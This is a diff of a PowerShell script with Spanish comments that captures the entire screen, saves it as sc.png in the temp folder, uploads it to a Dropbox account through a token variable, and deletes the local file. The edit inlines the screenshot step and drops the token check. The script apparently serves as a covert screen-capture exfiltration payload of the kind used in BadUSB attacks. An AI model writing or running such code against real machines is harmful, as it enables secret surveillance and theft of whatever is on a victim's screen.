@@ -1,4 +1,4 @@
-# Función para subir un archivo a Dropbox con manejo de errores
+# Función para subir un archivo a Dropbox
 function DropBox-Upload {
     param (
         [string]$SourceFilePath
@@ -29,35 +29,21 @@ function DropBox-Upload {
     }
 }
 
-# Función para tomar una captura de pantalla
-function Take-Screenshot {
-    Add-Type -AssemblyName System.Windows.Forms
-    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
-    
-    # Guardar la captura de pantalla en un archivo temporal
-    $filePath = "$env:temp\sc.png"
-    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-    $graphics.Dispose()
-    $bitmap.Dispose()
-    
-    return $filePath
-}
+# Cargar System.Windows.Forms y tomar una captura de pantalla
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
 
-# Captura de pantalla y subida a Dropbox
-$filePath = Take-Screenshot
+# Guardar la captura de pantalla en un archivo temporal
+$filePath = "$env:TEMP\sc.png"
+$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+$graphics.Dispose()
+$bitmap.Dispose()
 
-# Verificar si el token está definido
-if (-not [string]::IsNullOrEmpty($db)) {
-    DropBox-Upload -SourceFilePath $filePath
-} else {
-    Write-Host "El token de Dropbox no está definido. No se puede subir el archivo." -ForegroundColor Red
-}
+# Subir la captura de pantalla a Dropbox
+DropBox-Upload -SourceFilePath $filePath
 
-# Eliminar el archivo temporal después de la subida
-if (Test-Path $filePath) {
-    Remove-Item -Path $filePath -Force
-    Write-Host "Archivo temporal eliminado: $filePath" -ForegroundColor Yellow
-}
+# Eliminar el archivo temporal
+Remove-Item -Path $filePath
